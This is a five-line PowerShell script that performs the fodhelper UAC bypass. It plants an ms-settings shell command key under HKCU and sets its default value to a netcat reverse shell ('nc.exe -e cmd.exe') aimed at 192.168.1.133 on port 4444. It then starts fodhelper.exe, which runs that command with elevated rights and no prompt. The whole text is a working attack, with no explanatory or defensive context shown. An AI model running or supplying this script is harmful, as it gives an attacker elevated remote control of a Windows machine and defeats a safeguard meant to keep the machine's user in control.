$path = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
New-Item -Path $path -Force
Set-ItemProperty -Path $path -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path $path -Name "(default)" -Value "C:\\Windows\\Tasks\\nc.exe -e cmd.exe 192.168.1.133 4444"
Start-Process "C:\Windows\System32\fodhelper.exe"
